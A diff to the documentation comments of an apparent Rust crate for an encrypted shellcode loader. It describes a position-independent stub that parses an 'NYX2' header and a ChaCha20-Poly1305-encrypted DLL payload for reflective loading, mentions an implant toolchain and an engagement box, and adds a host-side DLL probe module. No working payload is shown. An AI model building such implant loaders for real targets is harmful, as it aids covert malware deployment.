@@ -20,10 +20,11 @@
 //!                                                    stub self-locates
 //!                                                    finds NYX2 magic
 //!                                                    reads len + nonce
-//!                                                    decrypt + reflective load
-//!                                                    (on-target shellcode;
-//!                                                   see stub::reflective_load
-//!                                                   for the host-side reference)
+//!                                                    [on-target decrypt +
+//!                                                     reflective load is out
+//!                                                     of scope for this crate
+//!                                                     — loading is verified
+//!                                                     host-side via dll_probe]
 //! ```
 //!
 //! ## Payload layout
@@ -43,6 +44,7 @@
 //! where N = `dll_bytes.len()` (ChaCha20-Poly1305 ciphertext is same length
 //! as plaintext).
 
+pub mod dll_probe;
 pub mod peb_walk;
 pub mod stub;
 
@@ -97,17 +99,21 @@ impl LoaderConfig {
 
 // ── Public API ──────────────────────────────────────────────────────────
 
-/// Return the raw PIC stub shellcode bytes.
+/// Return the raw PIC stub shellcode bytes (Layer 1 trampoline).
 ///
 /// This is the position-independent x86-64 code that self-locates, finds the
-/// NYX2 header, and parses the encrypted-payload header. The trailing reserved
-/// bytes are patched into a decrypt + reflective-load trampoline by the
-/// on-target build (implant-win toolchain); on the dev host the stub returns
-/// immediately so the generated blob is inert when inspected.
+/// NYX2 header, and parses the encrypted-payload header, populating the
+/// trampoline-register ABI. The trailing reserved bytes are the on-target
+/// trampoline slot — the decrypt + reflective-load shellcode that would patch
+/// in there is intentionally out of scope for this host-side crate (it needs
+/// Windows-VM iterative debugging); on the dev host the slot is NOP so the
+/// generated blob is inert when inspected.
 ///
-/// The host-side reference implementation of the reflective loading algorithm
-/// (section mapping, base relocation, import resolution) lives in
-/// [`stub::reflective_load`].
+/// Loading verification on the engagement box is done host-side via
+/// [`dll_probe::DllProbe`] (`LoadLibraryW` the built DLL + enumerate
+/// selftests), and the host-side reference implementation of the reflective
+/// loading algorithm (section mapping, base relocation, import resolution)
+/// lives in [`stub::reflective_load`].
 ///
 /// The returned slice is a `'static` reference to a compile-time constant;
 /// callers that need an owned buffer can use `to_vec()`.
